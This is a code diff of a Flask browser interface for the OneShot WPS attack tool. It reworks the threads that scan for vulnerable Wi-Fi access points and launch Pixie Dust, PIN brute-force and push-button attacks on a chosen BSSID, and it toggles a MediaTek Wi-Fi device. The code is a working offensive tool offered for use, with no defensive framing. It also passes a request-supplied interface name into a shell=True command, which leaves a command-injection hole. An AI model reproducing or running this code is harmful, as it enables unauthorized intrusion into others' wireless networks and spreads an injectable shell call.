@@ -2,10 +2,10 @@
 """
 OneShot WebUI - Cross-platform browser interface for OneShot WPS attack
 Same interface everywhere: Linux, Kali, Termux (Android)
-Single-file, all 16 CLI options mapped to GUI controls
+All 16 CLI options mapped to GUI controls
 """
 
-import os, sys, re, json, time, io, queue, signal, socket, threading, subprocess
+import os, sys, re, json, time, io, queue, signal, socket, threading, subprocess, argparse
 
 try:
     from flask import Flask, request, jsonify, Response, render_template_string
@@ -13,7 +13,11 @@ except ImportError:
     print("[-] Flask required. Install: pip install flask")
     sys.exit(1)
 
-from oneshot import OneShot, NetworkAddress, WPSpin, Companion, WiFiScanner
+# Import oneshot classes (not OneShot — that class doesn't exist)
+import oneshot
+oneshot.args = argparse.Namespace(loop=False, reverse_scan=False)
+
+from oneshot import Companion, WiFiScanner, NetworkAddress, WPSpin
 
 # ============================================================
 # Global State
@@ -22,7 +26,7 @@ log_queue = queue.Queue()
 stop_event = threading.Event()
 scan_results = []
 attack_running = False
-current_oneshot = None
+current_companion = None
 operation_thread = None
 
 app = Flask(__name__)
@@ -77,49 +81,112 @@ def get_own_ip():
         s.close()
     return ip
 
+def ifaceUp(iface, down=False):
+    action = 'down' if down else 'up'
+    cmd = 'ip link set {} {}'.format(iface, action)
+    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    return res.returncode == 0
+
+# ============================================================
+# Background Workers
+# ============================================================
 def do_scan_in_thread(iface):
     global scan_results
     with LogCapture():
         try:
-            scanner = WiFiScanner(iface)
-            scan_results = scanner.scan()
+            if not ifaceUp(iface):
+                print(f"[-] Failed to bring up {iface}")
+                return
+            with open(oneshot.args.vuln_list if hasattr(oneshot.args, 'vuln_list') and oneshot.args.vuln_list
+                      else os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'),
+                      'r', encoding='utf-8') as f:
+                vuln_list = f.read().splitlines()
+        except:
+            vuln_list = []
+        try:
+            scanner = WiFiScanner(iface, vuln_list)
+            result = scanner.iw_scanner()
+            scan_results = list(result.values()) if result else []
         except Exception as e:
             print(f"[-] Scan error: {e}")
     log_queue.put('__SCAN_DONE__')
 
 def do_attack_in_thread(params):
-    global attack_running, current_oneshot
+    global attack_running, current_companion
     attack_running = True
     stop_event.clear()
+
+    iface = params.get('iface', 'wlan0')
+    bssid = params.get('bssid', '')
+    pin = params.get('pin', '')
+    delay = params.get('delay', 0)
+    pixie = params.get('pixie', False)
+    bruteforce = params.get('bruteforce', False)
+    pbc = params.get('pbc', False)
+    show_cmd = params.get('show_cmd', False)
+    pixie_force = params.get('force', False)
+    verbose = params.get('verbose', False)
+    write = params.get('write', False)
+    iface_down = params.get('iface_down', False)
+    loop = params.get('loop', False)
+    mtk = params.get('mtk', False)
+
     with LogCapture():
         try:
-            os = OneShot()
-            os.iface = params.get('iface', 'wlan0')
-            os.bssid = params.get('bssid', '')
-            os.pin = params.get('pin', '')
-            os.delay = int(params.get('delay', 0))
-            os.write = params.get('write', False)
-            os.pixie = params.get('pixie', False)
-            os.bruteforce = params.get('bruteforce', False)
-            os.pbc = params.get('pbc', False)
-            os.force = params.get('force', False)
-            os.show_cmd = params.get('show_cmd', False)
-            os.iface_down = params.get('iface_down', False)
-            os.loop = params.get('loop', False)
-            os.reverse = params.get('reverse', False)
-            os.mtk = params.get('mtk', False)
-            os.verbose = params.get('verbose', False)
-            vuln = params.get('vuln_list', '')
-            if vuln:
-                os.vuln_list = vuln
+            if mtk:
+                from pathlib import Path
+                wmt = Path('/dev/wmtWifi')
+                if wmt.is_char_device():
+                    wmt.chmod(0o644)
+                    wmt.write_text('1')
+                else:
+                    print("[-] /dev/wmtWifi not found")
+                    return
 
-            current_oneshot = os
-            os.init()
-            os.run()
+            if not ifaceUp(iface):
+                print(f"[-] Failed to bring up {iface}")
+                return
+
+            while True:
+                try:
+                    if stop_event.is_set():
+                        print("[!] Attack stopped by user")
+                        break
+
+                    oneshot.args.loop = loop
+                    companion = Companion(iface, write, print_debug=verbose)
+                    current_companion = companion
+
+                    if pbc:
+                        companion.single_connection(pbc_mode=True)
+                    elif bruteforce:
+                        companion.smart_bruteforce(bssid, pin, delay)
+                    else:
+                        companion.single_connection(bssid, pin, pixie, False,
+                                                    show_cmd, pixie_force)
+
+                    if not loop:
+                        break
+                except KeyboardInterrupt:
+                    if loop:
+                        print("[?] Continuing loop...")
+                        continue
+                    else:
+                        print("\n[!] Aborting…")
+                        break
         except Exception as e:
             print(f"[-] Attack error: {e}")
         finally:
+            if iface_down:
+                ifaceUp(iface, down=True)
+            if mtk:
+                try:
+                    wmt.write_text('0')
+                except:
+                    pass
             attack_running = False
+            current_companion = None
+
     log_queue.put('__ATTACK_DONE__')
 
 # ============================================================
@@ -146,14 +213,14 @@ def api_networks():
     data = []
     for n in scan_results:
         data.append({
-            'bssid': getattr(n, 'bssid', ''),
-            'essid': getattr(n, 'essid', '') or '<hidden>',
-            'channel': getattr(n, 'channel', ''),
-            'signal': getattr(n, 'signal', ''),
-            'encrypted': getattr(n, 'encrypted', ''),
-            'wps': getattr(n, 'wps', ''),
-            'locked': getattr(n, 'locked', ''),
-            'vuln': getattr(n, 'vuln', False),
+            'bssid': n.get('BSSID', ''),
+            'essid': n.get('ESSID', '<hidden>'),
+            'channel': '',
+            'signal': str(n.get('Level', '')),
+            'encrypted': n.get('Security type', ''),
+            'wps': str(n.get('WPS', '')),
+            'locked': n.get('WPS locked', False),
+            'vuln': False,
         })
     return jsonify(data)
 
@@ -179,13 +246,8 @@ def api_attack():
 
 @app.route('/api/stop')
 def api_stop():
-    global current_oneshot, attack_running
+    global current_companion, attack_running
     stop_event.set()
-    if current_oneshot:
-        try:
-            current_oneshot.stop = True
-        except:
-            pass
     attack_running = False
     return jsonify({'status': 'ok'})
 
@@ -199,16 +261,15 @@ def api_status():
 @app.route('/stream')
 def stream():
     def generate():
-        local_q = queue.Queue()
         while True:
             try:
                 msg = log_queue.get(timeout=30)
-                if msg == '__SCAN_DONE__' or msg == '__ATTACK_DONE__':
+                if msg in ('__SCAN_DONE__', '__ATTACK_DONE__'):
                     yield f"event: done\ndata: {json.dumps({'msg': msg})}\n\n"
                 else:
                     yield f"data: {json.dumps({'msg': msg})}\n\n"
             except queue.Empty:
-                yield f": heartbeat\n\n"
+                yield ": heartbeat\n\n"
     return Response(generate(), mimetype='text/event-stream')
 
 # ============================================================
